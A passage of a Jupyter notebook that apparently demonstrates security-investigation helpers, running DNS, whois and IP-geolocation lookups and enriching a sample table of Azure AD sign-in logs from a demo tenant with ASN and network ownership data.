       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>CountryCode</th>\n",
       "      <th>CountryOrRegionName</th>\n",
       "      <th>State</th>\n",
       "      <th>City</th>\n",
       "      <th>Longitude</th>\n",
       "      <th>Latitude</th>\n",
       "      <th>TimeGenerated</th>\n",
       "      <th>Type</th>\n",
       "      <th>IpAddress</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>0</th>\n",
       "      <td>US</td>\n",
       "      <td>United States</td>\n",
       "      <td>Washington</td>\n",
       "      <td>Seattle</td>\n",
       "      <td>-122.2994</td>\n",
       "      <td>47.6859</td>\n",
       "      <td>2025-08-16 02:53:49.341030</td>\n",
       "      <td>geolocation</td>\n",
       "      <td>24.16.133.227</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "</div>"
      ],
      "text/plain": [
       "  CountryCode CountryOrRegionName       State     City  Longitude  Latitude  \\\n",
       "0          US       United States  Washington  Seattle  -122.2994   47.6859   \n",
       "\n",
       "               TimeGenerated         Type      IpAddress  \n",
       "0 2025-08-16 02:53:49.341030  geolocation  24.16.133.227  "
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "from IPython.display import HTML\n",
    "\n",
    "display(HTML(\"Dns resolution<br>\"))\n",
    "display(Dns.dns_resolve(\"www.microsoft.com\"))\n",
    "\n",
    "display(HTML(\"<br>Dns components<br>\"))\n",
    "display(Dns.util.dns_components(\"www.microsoft.com\"))\n",
    "\n",
    "display(HTML(\"<br>IP address type<br>\"))\n",
    "display(IpAddress.ip_type(\"24.16.133.227\"))\n",
    "\n",
    "display(HTML(\"<br>IP address ownership<br>\"))\n",
    "display(IpAddress.whois(\"24.16.133.227\"))\n",
    "\n",
    "display(HTML(\"<br>IP address location<br>\"))\n",
    "display(IpAddress.geoloc(\"24.16.133.227\"))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 69,
   "id": "a7a2ef1f",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>TenantId</th>\n",
       "      <th>SourceSystem</th>\n",
       "      <th>TimeGenerated</th>\n",
       "      <th>ResourceId</th>\n",
       "      <th>OperationName</th>\n",
       "      <th>OperationVersion</th>\n",
       "      <th>Category</th>\n",
       "      <th>ResultType</th>\n",
       "      <th>ResultSignature</th>\n",
       "      <th>ResultDescription</th>\n",
       "      <th>DurationMs</th>\n",
       "      <th>CorrelationId</th>\n",
       "      <th>Resource</th>\n",
       "      <th>ResourceGroup</th>\n",
       "      <th>ResourceProvider</th>\n",
       "      <th>Identity</th>\n",
       "      <th>Level</th>\n",
       "      <th>Location</th>\n",
       "      <th>AlternateSignInName</th>\n",
       "      <th>AppDisplayName</th>\n",
       "      <th>AppId</th>\n",
       "      <th>AuthenticationDetails</th>\n",
       "      <th>AuthenticationMethodsUsed</th>\n",
       "      <th>AuthenticationProcessingDetails</th>\n",
       "      <th>AuthenticationRequirement</th>\n",
       "      <th>...</th>\n",
       "      <th>ResourceIdentity</th>\n",
       "      <th>ServicePrincipalId</th>\n",
       "      <th>ServicePrincipalName</th>\n",
       "      <th>Status</th>\n",
       "      <th>TokenIssuerName</th>\n",
       "      <th>TokenIssuerType</th>\n",
       "      <th>UserAgent</th>\n",
       "      <th>UserDisplayName</th>\n",
       "      <th>UserId</th>\n",
       "      <th>UserPrincipalName</th>\n",
       "      <th>AADTenantId</th>\n",
       "      <th>Type</th>\n",
       "      <th>Result</th>\n",
       "      <th>Latitude</th>\n",
       "      <th>Longitude</th>\n",
       "      <th>asn</th>\n",
       "      <th>query</th>\n",
       "      <th>asn_cidr</th>\n",
       "      <th>asn_country_code</th>\n",
       "      <th>asn_registry</th>\n",
       "      <th>asn_date</th>\n",
       "      <th>asn_description</th>\n",
       "      <th>nets</th>\n",
       "      <th>WhoIsData</th>\n",
       "      <th>AsnDescription</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>0</th>\n",
       "      <td>ab86c959-1ba3-495c-a00d-ced30d8825d3</td>\n",
       "      <td>Azure AD</td>\n",
       "      <td>2025-08-15 18:53:49.241233</td>\n",
       "      <td>/tenants/4b2462a4-bbee-495a-a0e1-f23ae524cc9c/providers/Microsoft.aadiam</td>\n",
       "      <td>Sign-in activity</td>\n",
       "      <td>1.0</td>\n",
       "      <td>SignInLogs</td>\n",
       "      <td>0</td>\n",
       "      <td>None</td>\n",
       "      <td>NaN</td>\n",
       "      <td>0</td>\n",
       "      <td>c4b4ea3c-58ff-4e0e-b5b0-d2ea01cce380</td>\n",
       "      <td>Microsoft.aadiam</td>\n",
       "      <td>Microsoft.aadiam</td>\n",
       "      <td>NaN</td>\n",
       "      <td>CTFUser3</td>\n",
       "      <td>4</td>\n",
       "      <td>US</td>\n",
       "      <td>NaN</td>\n",
       "      <td>Azure Portal</td>\n",
       "      <td>c44b4083-3bb0-49c1-b47d-974e53cbdf3c</td>\n",
       "      <td>[]</td>\n",
       "      <td>NaN</td>\n",
       "      <td>[]</td>\n",
       "      <td>singleFactorAuthentication</td>\n",
       "      <td>...</td>\n",
       "      <td>797f4846-ba00-4fd7-ba43-dac1f8f63013</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>{'errorCode': 0}</td>\n",
       "      <td>NaN</td>\n",
       "      <td>AzureAD</td>\n",
       "      <td>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.404...</td>\n",
       "      <td>CTFUser3</td>\n",
       "      <td>acc49186-e946-4f6c-85af-669807da0e0f</td>\n",
       "      <td>ctfuser3@seccxp.ninja</td>\n",
       "      <td>4b2462a4-bbee-495a-a0e1-f23ae524cc9c</td>\n",
       "      <td>SigninLogs</td>\n",
       "      <td>Sucess</td>\n",
       "      <td>42.997181</td>\n",
       "      <td>-86.848312</td>\n",
       "      <td>7922</td>\n",
       "      <td>24.13.212.221</td>\n",
       "      <td>24.0.0.0/12</td>\n",
       "      <td>US</td>\n",
       "      <td>arin</td>\n",
       "      <td>2003-10-06</td>\n",
       "      <td>COMCAST-7922, US</td>\n",
       "      <td>[{'cidr': '24.12.0.0/14', 'handle': 'NET-24-12-0-0-1', 'name': 'CHICAGO-CPE-1', 'startAddress': ...</td>\n",
       "      <td>{'asn': '7922', 'query': '24.13.212.221', 'asn_cidr': '24.0.0.0/12', 'asn_country_code': 'US', '...</td>\n",
       "      <td>COMCAST-7922, US</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>1</th>\n",
       "      <td>ab86c959-1ba3-495c-a00d-ced30d8825d3</td>\n",
       "      <td>Azure AD</td>\n",
       "      <td>2025-08-15 19:07:29.645233</td>\n",
       "      <td>/tenants/4b2462a4-bbee-495a-a0e1-f23ae524cc9c/providers/Microsoft.aadiam</td>\n",
       "      <td>Sign-in activity</td>\n",
       "      <td>1.0</td>\n",
       "      <td>SignInLogs</td>\n",
       "      <td>0</td>\n",
       "      <td>None</td>\n",
       "      <td>NaN</td>\n",
       "      <td>0</td>\n",
       "      <td>d5ef0f81-318f-4881-8df1-8415aab77d1a</td>\n",
       "      <td>Microsoft.aadiam</td>\n",
       "      <td>Microsoft.aadiam</td>\n",
       "      <td>NaN</td>\n",
       "      <td>Zack Von</td>\n",
       "      <td>4</td>\n",
       "      <td>US</td>\n",
       "      <td>NaN</td>\n",
       "      <td>Azure Portal</td>\n",
       "      <td>c44b4083-3bb0-49c1-b47d-974e53cbdf3c</td>\n",
       "      <td>[]</td>\n",
       "      <td>NaN</td>\n",
       "      <td>[]</td>\n",
       "      <td>NaN</td>\n",
       "      <td>...</td>\n",
       "      <td>797f4846-ba00-4fd7-ba43-dac1f8f63013</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>{'errorCode': 0}</td>\n",
       "      <td>NaN</td>\n",
       "      <td>AzureAD</td>\n",
       "      <td>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.404...</td>\n",
       "      <td>Zack Von</td>\n",
       "      <td>2566a1a6-4d03-40d2-8836-6c8cf1ce517f</td>\n",
       "      <td>zvon@seccxp.ninja</td>\n",
       "      <td>4b2462a4-bbee-495a-a0e1-f23ae524cc9c</td>\n",
       "      <td>SigninLogs</td>\n",
       "      <td>Sucess</td>\n",
       "      <td>48.614380</td>\n",
       "      <td>-121.110313</td>\n",
       "      <td>7922</td>\n",
       "      <td>24.16.133.227</td>\n",
       "      <td>24.16.0.0/13</td>\n",
       "      <td>US</td>\n",
       "      <td>arin</td>\n",
       "      <td>2003-10-06</td>\n",
       "      <td>COMCAST-7922, US</td>\n",
       "      <td>[{'cidr': '24.16.0.0/14', 'handle': 'NET-24-16-0-0-2', 'name': 'WASHINGTON-9', 'startAddress': '...</td>\n",
       "      <td>{'asn': '7922', 'query': '24.16.133.227', 'asn_cidr': '24.16.0.0/13', 'asn_country_code': 'US', ...</td>\n",
       "      <td>COMCAST-7922, US</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>2</th>\n",
       "      <td>ab86c959-1ba3-495c-a00d-ced30d8825d3</td>\n",
       "      <td>Azure AD</td>\n",
       "      <td>2025-08-15 17:40:20.627233</td>\n",
       "      <td>/tenants/4b2462a4-bbee-495a-a0e1-f23ae524cc9c/providers/Microsoft.aadiam</td>\n",
       "      <td>Sign-in activity</td>\n",
       "      <td>1.0</td>\n",
       "      <td>SignInLogs</td>\n",
       "      <td>0</td>\n",
       "      <td>None</td>\n",
       "      <td>NaN</td>\n",
       "      <td>0</td>\n",
       "      <td>bf124019-b325-4a4a-81ff-6c2823461620</td>\n",
       "      <td>Microsoft.aadiam</td>\n",
       "      <td>Microsoft.aadiam</td>\n",
       "      <td>NaN</td>\n",
       "      <td>CTFUser3</td>\n",
       "      <td>4</td>\n",
       "      <td>US</td>\n",
       "      <td>NaN</td>\n",
       "      <td>Azure Portal</td>\n",
       "      <td>c44b4083-3bb0-49c1-b47d-974e53cbdf3c</td>\n",
       "      <td>[]</td>\n",
       "      <td>NaN</td>\n",
       "      <td>[\\r\\n  {\\r\\n    \"key\": \"Login Hint Present\",\\r\\n    \"value\": \"True\"\\r\\n  }\\r\\n]</td>\n",
       "      <td>singleFactorAuthentication</td>\n",
       "      <td>...</td>\n",
       "      <td>797f4846-ba00-4fd7-ba43-dac1f8f63013</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>{'errorCode': 0}</td>\n",
       "      <td>NaN</td>\n",
       "      <td>AzureAD</td>\n",
       "      <td>Mozilla/5.0 (Windows NT 10.0; ) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safa...</td>\n",
       "      <td>CTFUser3</td>\n",
       "      <td>acc49186-e946-4f6c-85af-669807da0e0f</td>\n",
       "      <td>ctfuser3@seccxp.ninja</td>\n",
       "      <td>4b2462a4-bbee-495a-a0e1-f23ae524cc9c</td>\n",
       "      <td>SigninLogs</td>\n",
       "      <td>Sucess</td>\n",
       "      <td>41.465630</td>\n",
       "      <td>-73.610718</td>\n",
       "      <td>7922</td>\n",
       "      <td>73.226.223.252</td>\n",
       "      <td>73.0.0.0/8</td>\n",
       "      <td>US</td>\n",
       "      <td>arin</td>\n",
       "      <td>2005-04-19</td>\n",
       "      <td>COMCAST-7922, US</td>\n",
       "      <td>[{'cidr': '73.0.0.0/8', 'handle': 'NET-73-0-0-0-1', 'name': 'CABLE-1', 'startAddress': '73.0.0.0...</td>\n",
       "      <td>{'asn': '7922', 'query': '73.226.223.252', 'asn_cidr': '73.0.0.0/8', 'asn_country_code': 'US', '...</td>\n",
       "      <td>COMCAST-7922, US</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>3</th>\n",
       "      <td>ab86c959-1ba3-495c-a00d-ced30d8825d3</td>\n",
       "      <td>Azure AD</td>\n",
       "      <td>2025-08-15 15:56:19.558233</td>\n",
       "      <td>/tenants/4b2462a4-bbee-495a-a0e1-f23ae524cc9c/providers/Microsoft.aadiam</td>\n",
       "      <td>Sign-in activity</td>\n",
       "      <td>1.0</td>\n",
       "      <td>SignInLogs</td>\n",
       "      <td>0</td>\n",
       "      <td>None</td>\n",
       "      <td>NaN</td>\n",
       "      <td>0</td>\n",
       "      <td>65a46b12-42a7-419f-9bb7-b2de8cc1ce99</td>\n",
       "      <td>Microsoft.aadiam</td>\n",
       "      <td>Microsoft.aadiam</td>\n",
       "      <td>NaN</td>\n",
       "      <td>Demo</td>\n",
       "      <td>4</td>\n",
       "      <td>US</td>\n",
       "      <td>NaN</td>\n",
       "      <td>Office 365 Exchange Online</td>\n",
       "      <td>00000002-0000-0ff1-ce00-000000000000</td>\n",
       "      <td>[]</td>\n",
       "      <td>NaN</td>\n",
       "      <td>[\\r\\n  {\\r\\n    \"key\": \"Login Hint Present\",\\r\\n    \"value\": \"True\"\\r\\n  }\\r\\n]</td>\n",
       "      <td>NaN</td>\n",
       "      <td>...</td>\n",
       "      <td>00000002-0000-0ff1-ce00-000000000000</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>{'errorCode': 0}</td>\n",
       "      <td>NaN</td>\n",
       "      <td>AzureAD</td>\n",
       "      <td>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.404...</td>\n",
       "      <td>Demo</td>\n",
       "      <td>0872937f-1d3c-4426-9d4d-8a1f1cd23a4b</td>\n",
       "      <td>demo@seccxp.ninja</td>\n",
       "      <td>4b2462a4-bbee-495a-a0e1-f23ae524cc9c</td>\n",
       "      <td>SigninLogs</td>\n",
       "      <td>Sucess</td>\n",
       "      <td>49.307449</td>\n",
       "      <td>-121.608269</td>\n",
       "      <td>7922</td>\n",
       "      <td>73.35.204.105</td>\n",
       "      <td>73.0.0.0/8</td>\n",
       "      <td>US</td>\n",
       "      <td>arin</td>\n",
       "      <td>2005-04-19</td>\n",
       "      <td>COMCAST-7922, US</td>\n",
       "      <td>[{'cidr': '73.35.128.0/17', 'handle': 'NET-73-35-128-0-1', 'name': 'SEATTLE-32', 'startAddress':...</td>\n",
       "      <td>{'asn': '7922', 'query': '73.35.204.105', 'asn_cidr': '73.0.0.0/8', 'asn_country_code': 'US', 'a...</td>\n",
       "      <td>COMCAST-7922, US</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>4</th>\n",
       "      <td>ab86c959-1ba3-495c-a00d-ced30d8825d3</td>\n",
       "      <td>Azure AD</td>\n",
       "      <td>2025-08-15 12:22:00.161233</td>\n",
       "      <td>/tenants/4b2462a4-bbee-495a-a0e1-f23ae524cc9c/providers/Microsoft.aadiam</td>\n",
       "      <td>Sign-in activity</td>\n",
       "      <td>1.0</td>\n",
       "      <td>SignInLogs</td>\n",
       "      <td>90072</td>\n",
       "      <td>None</td>\n",
       "      <td>Other</td>\n",
       "      <td>0</td>\n",
       "      <td>5841549f-e0fd-0000-cd0c-81c65655d82b</td>\n",
       "      <td>Microsoft.aadiam</td>\n",
       "      <td>Microsoft.aadiam</td>\n",
       "      <td>NaN</td>\n",
       "      <td>Megan Bowens</td>\n",
       "      <td>4</td>\n",
       "      <td>US</td>\n",
       "      <td>NaN</td>\n",
       "      <td>Office 365 SharePoint Online</td>\n",
       "      <td>00000003-0000-0ff1-ce00-000000000000</td>\n",
       "      <td>[]</td>\n",
       "      <td>NaN</td>\n",
       "      <td>[]</td>\n",
       "      <td>multiFactorAuthentication</td>\n",
       "      <td>...</td>\n",
       "      <td>00000003-0000-0ff1-ce00-000000000000</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>{'errorCode': 90072, 'failureReason': 'Other'}</td>\n",
       "      <td>NaN</td>\n",
       "      <td>AzureAD</td>\n",
       "      <td>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.404...</td>\n",
       "      <td>Megan Bowens</td>\n",
       "      <td>eababd92-9dc7-40e3-9359-6c106522db19</td>\n",
       "      <td>meganb@seccxp.ninja</td>\n",
       "      <td>4b2462a4-bbee-495a-a0e1-f23ae524cc9c</td>\n",
       "      <td>SigninLogs</td>\n",
       "      <td>Failed</td>\n",
       "      <td>34.798458</td>\n",
       "      <td>-83.388283</td>\n",
       "      <td>16591</td>\n",
       "      <td>136.55.145.135</td>\n",
       "      <td>136.32.0.0/11</td>\n",
       "      <td>US</td>\n",
       "      <td>arin</td>\n",
       "      <td>2015-10-06</td>\n",
       "      <td>GOOGLE-FIBER, US</td>\n",
       "      <td>[{'cidr': '136.32.0.0/11', 'handle': 'NET-136-32-0-0-1', 'name': 'GOOGLE-FIBER', 'startAddress':...</td>\n",
       "      <td>{'asn': '16591', 'query': '136.55.145.135', 'asn_cidr': '136.32.0.0/11', 'asn_country_code': 'US...</td>\n",
       "      <td>GOOGLE-FIBER, US</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "<p>5 rows × 72 columns</p>\n",
       "</div>"
      ],
      "text/plain": [
       "                               TenantId SourceSystem  \\\n",
       "0  ab86c959-1ba3-495c-a00d-ced30d8825d3     Azure AD   \n",
       "1  ab86c959-1ba3-495c-a00d-ced30d8825d3     Azure AD   \n",
       "2  ab86c959-1ba3-495c-a00d-ced30d8825d3     Azure AD   \n",
       "3  ab86c959-1ba3-495c-a00d-ced30d8825d3     Azure AD   \n",
       "4  ab86c959-1ba3-495c-a00d-ced30d8825d3     Azure AD   \n",
       "\n",
       "               TimeGenerated  \\\n",
       "0 2025-08-15 18:53:49.241233   \n",
       "1 2025-08-15 19:07:29.645233   \n",
       "2 2025-08-15 17:40:20.627233   \n",
       "3 2025-08-15 15:56:19.558233   \n",
       "4 2025-08-15 12:22:00.161233   \n",
       "\n",
       "                                                                 ResourceId  \\\n",
       "0  /tenants/4b2462a4-bbee-495a-a0e1-f23ae524cc9c/providers/Microsoft.aadiam   \n",
       "1  /tenants/4b2462a4-bbee-495a-a0e1-f23ae524cc9c/providers/Microsoft.aadiam   \n",
       "2  /tenants/4b2462a4-bbee-495a-a0e1-f23ae524cc9c/providers/Microsoft.aadiam   \n",
       "3  /tenants/4b2462a4-bbee-495a-a0e1-f23ae524cc9c/providers/Microsoft.aadiam   \n",
       "4  /tenants/4b2462a4-bbee-495a-a0e1-f23ae524cc9c/providers/Microsoft.aadiam   \n",
       "\n",
       "      OperationName  OperationVersion    Category  ResultType ResultSignature  \\\n",
       "0  Sign-in activity               1.0  SignInLogs           0            None   \n",
       "1  Sign-in activity               1.0  SignInLogs           0            None   \n",
       "2  Sign-in activity               1.0  SignInLogs           0            None   \n",
       "3  Sign-in activity               1.0  SignInLogs           0            None   \n",
       "4  Sign-in activity               1.0  SignInLogs       90072            None   \n",
       "\n",
       "  ResultDescription  DurationMs                         CorrelationId  \\\n",
       "0               NaN           0  c4b4ea3c-58ff-4e0e-b5b0-d2ea01cce380   \n",
       "1               NaN           0  d5ef0f81-318f-4881-8df1-8415aab77d1a   \n",
       "2               NaN           0  bf124019-b325-4a4a-81ff-6c2823461620   \n",
       "3               NaN           0  65a46b12-42a7-419f-9bb7-b2de8cc1ce99   \n",
       "4             Other           0  5841549f-e0fd-0000-cd0c-81c65655d82b   \n",
       "\n",
       "           Resource     ResourceGroup  ResourceProvider      Identity  Level  \\\n",
       "0  Microsoft.aadiam  Microsoft.aadiam               NaN      CTFUser3      4   \n",
       "1  Microsoft.aadiam  Microsoft.aadiam               NaN      Zack Von      4   \n",
       "2  Microsoft.aadiam  Microsoft.aadiam               NaN      CTFUser3      4   \n",
       "3  Microsoft.aadiam  Microsoft.aadiam               NaN          Demo      4   \n",
       "4  Microsoft.aadiam  Microsoft.aadiam               NaN  Megan Bowens      4   \n",
       "\n",
       "  Location AlternateSignInName                AppDisplayName  \\\n",
       "0       US                 NaN                  Azure Portal   \n",
       "1       US                 NaN                  Azure Portal   \n",
       "2       US                 NaN                  Azure Portal   \n",
       "3       US                 NaN    Office 365 Exchange Online   \n",
       "4       US                 NaN  Office 365 SharePoint Online   \n",
       "\n",
       "                                  AppId AuthenticationDetails  \\\n",
       "0  c44b4083-3bb0-49c1-b47d-974e53cbdf3c                    []   \n",
       "1  c44b4083-3bb0-49c1-b47d-974e53cbdf3c                    []   \n",
       "2  c44b4083-3bb0-49c1-b47d-974e53cbdf3c                    []   \n",
       "3  00000002-0000-0ff1-ce00-000000000000                    []   \n",
       "4  00000003-0000-0ff1-ce00-000000000000                    []   \n",
       "\n",
       "   AuthenticationMethodsUsed  \\\n",
       "0                        NaN   \n",
       "1                        NaN   \n",
       "2                        NaN   \n",
       "3                        NaN   \n",
       "4                        NaN   \n",
       "\n",
       "                                                   AuthenticationProcessingDetails  \\\n",
       "0                                                                               []   \n",
       "1                                                                               []   \n",
       "2  [\\r\\n  {\\r\\n    \"key\": \"Login Hint Present\",\\r\\n    \"value\": \"True\"\\r\\n  }\\r\\n]   \n",
       "3  [\\r\\n  {\\r\\n    \"key\": \"Login Hint Present\",\\r\\n    \"value\": \"True\"\\r\\n  }\\r\\n]   \n",
       "4                                                                               []   \n",
       "\n",
       "    AuthenticationRequirement  ...                      ResourceIdentity  \\\n",
       "0  singleFactorAuthentication  ...  797f4846-ba00-4fd7-ba43-dac1f8f63013   \n",
       "1                         NaN  ...  797f4846-ba00-4fd7-ba43-dac1f8f63013   \n",
       "2  singleFactorAuthentication  ...  797f4846-ba00-4fd7-ba43-dac1f8f63013   \n",
       "3                         NaN  ...  00000002-0000-0ff1-ce00-000000000000   \n",
       "4   multiFactorAuthentication  ...  00000003-0000-0ff1-ce00-000000000000   \n",
       "\n",
       "  ServicePrincipalId ServicePrincipalName  \\\n",
       "0                NaN                  NaN   \n",
       "1                NaN                  NaN   \n",
       "2                NaN                  NaN   \n",
       "3                NaN                  NaN   \n",
       "4                NaN                  NaN   \n",
       "\n",
       "                                           Status TokenIssuerName  \\\n",
       "0                                {'errorCode': 0}             NaN   \n",
       "1                                {'errorCode': 0}             NaN   \n",
       "2                                {'errorCode': 0}             NaN   \n",
       "3                                {'errorCode': 0}             NaN   \n",
       "4  {'errorCode': 90072, 'failureReason': 'Other'}             NaN   \n",
       "\n",
       "  TokenIssuerType  \\\n",
       "0         AzureAD   \n",
       "1         AzureAD   \n",
       "2         AzureAD   \n",
       "3         AzureAD   \n",
       "4         AzureAD   \n",
       "\n",
       "                                                                                             UserAgent  \\\n",
       "0  Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.404...   \n",
       "1  Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.404...   \n",
       "2  Mozilla/5.0 (Windows NT 10.0; ) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safa...   \n",
       "3  Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.404...   \n",
       "4  Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.404...   \n",
       "\n",
       "  UserDisplayName                                UserId  \\\n",
       "0        CTFUser3  acc49186-e946-4f6c-85af-669807da0e0f   \n",
       "1        Zack Von  2566a1a6-4d03-40d2-8836-6c8cf1ce517f   \n",
       "2        CTFUser3  acc49186-e946-4f6c-85af-669807da0e0f   \n",
       "3            Demo  0872937f-1d3c-4426-9d4d-8a1f1cd23a4b   \n",
       "4    Megan Bowens  eababd92-9dc7-40e3-9359-6c106522db19   \n",
       "\n",
       "       UserPrincipalName                           AADTenantId        Type  \\\n",
       "0  ctfuser3@seccxp.ninja  4b2462a4-bbee-495a-a0e1-f23ae524cc9c  SigninLogs   \n",
       "1      zvon@seccxp.ninja  4b2462a4-bbee-495a-a0e1-f23ae524cc9c  SigninLogs   \n",
       "2  ctfuser3@seccxp.ninja  4b2462a4-bbee-495a-a0e1-f23ae524cc9c  SigninLogs   \n",
       "3      demo@seccxp.ninja  4b2462a4-bbee-495a-a0e1-f23ae524cc9c  SigninLogs   \n",
       "4    meganb@seccxp.ninja  4b2462a4-bbee-495a-a0e1-f23ae524cc9c  SigninLogs   \n",
       "\n",
       "   Result   Latitude   Longitude    asn           query       asn_cidr  \\\n",
       "0  Sucess  42.997181  -86.848312   7922   24.13.212.221    24.0.0.0/12   \n",
       "1  Sucess  48.614380 -121.110313   7922   24.16.133.227   24.16.0.0/13   \n",
       "2  Sucess  41.465630  -73.610718   7922  73.226.223.252     73.0.0.0/8   \n",
       "3  Sucess  49.307449 -121.608269   7922   73.35.204.105     73.0.0.0/8   \n",
       "4  Failed  34.798458  -83.388283  16591  136.55.145.135  136.32.0.0/11   \n",
       "\n",
       "  asn_country_code asn_registry    asn_date   asn_description  \\\n",
       "0               US         arin  2003-10-06  COMCAST-7922, US   \n",
       "1               US         arin  2003-10-06  COMCAST-7922, US   \n",
       "2               US         arin  2005-04-19  COMCAST-7922, US   \n",
       "3               US         arin  2005-04-19  COMCAST-7922, US   \n",
       "4               US         arin  2015-10-06  GOOGLE-FIBER, US   \n",
       "\n",
       "                                                                                                  nets  \\\n",
       "0  [{'cidr': '24.12.0.0/14', 'handle': 'NET-24-12-0-0-1', 'name': 'CHICAGO-CPE-1', 'startAddress': ...   \n",
       "1  [{'cidr': '24.16.0.0/14', 'handle': 'NET-24-16-0-0-2', 'name': 'WASHINGTON-9', 'startAddress': '...   \n",
       "2  [{'cidr': '73.0.0.0/8', 'handle': 'NET-73-0-0-0-1', 'name': 'CABLE-1', 'startAddress': '73.0.0.0...   \n",
       "3  [{'cidr': '73.35.128.0/17', 'handle': 'NET-73-35-128-0-1', 'name': 'SEATTLE-32', 'startAddress':...   \n",
       "4  [{'cidr': '136.32.0.0/11', 'handle': 'NET-136-32-0-0-1', 'name': 'GOOGLE-FIBER', 'startAddress':...   \n",
       "\n",
       "                                                                                             WhoIsData  \\\n",
       "0  {'asn': '7922', 'query': '24.13.212.221', 'asn_cidr': '24.0.0.0/12', 'asn_country_code': 'US', '...   \n",
       "1  {'asn': '7922', 'query': '24.16.133.227', 'asn_cidr': '24.16.0.0/13', 'asn_country_code': 'US', ...   \n",
       "2  {'asn': '7922', 'query': '73.226.223.252', 'asn_cidr': '73.0.0.0/8', 'asn_country_code': 'US', '...   \n",
       "3  {'asn': '7922', 'query': '73.35.204.105', 'asn_cidr': '73.0.0.0/8', 'asn_country_code': 'US', 'a...   \n",
       "4  {'asn': '16591', 'query': '136.55.145.135', 'asn_cidr': '136.32.0.0/11', 'asn_country_code': 'US...   \n",
       "\n",
       "     AsnDescription  \n",
       "0  COMCAST-7922, US  \n",
       "1  COMCAST-7922, US  \n",
       "2  COMCAST-7922, US  \n",
       "3  COMCAST-7922, US  \n",
       "4  GOOGLE-FIBER, US  \n",
       "\n",
       "[5 rows x 72 columns]"
      ]
     },
     "execution_count": 69,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "logons_subset = logons_df.drop_duplicates(\"IPAddress\").head()\n",
    "IpAddress.whois(logons_subset, column=\"IPAddress\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 70,
   "id": "3c7873d8",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>IPAddress_src</th>\n",
       "      <th>AppDisplayName_src</th>\n",
       "      <th>TimeGenerated_src</th>\n",
       "      <th>IPAddress_res</th>\n",
       "      <th>AppDisplayName_res</th>\n",
       "      <th>TimeGenerated_res</th>\n",
       "      <th>asn</th>\n",
       "      <th>query</th>\n",
       "      <th>asn_cidr</th>\n",
       "      <th>asn_country_code</th>\n",
       "      <th>asn_registry</th>\n",
       "      <th>asn_date</th>\n",
       "      <th>asn_description</th>\n",
       "      <th>nets</th>\n",
       "      <th>WhoIsData</th>\n",
       "      <th>AsnDescription</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>0</th>\n",
       "      <td>24.13.212.221</td>\n",
       "      <td>Azure Portal</td>\n",
       "      <td>2025-08-15 18:53:49.241233</td>\n",
       "      <td>24.13.212.221</td>\n",
       "      <td>Azure Portal</td>\n",
       "      <td>2025-08-15 18:53:49.241233</td>\n",
       "      <td>7922</td>\n",
       "      <td>24.13.212.221</td>\n",
       "      <td>24.0.0.0/12</td>\n",
       "      <td>US</td>\n",
       "      <td>arin</td>\n",
       "      <td>2003-10-06</td>\n",
       "      <td>COMCAST-7922, US</td>\n",
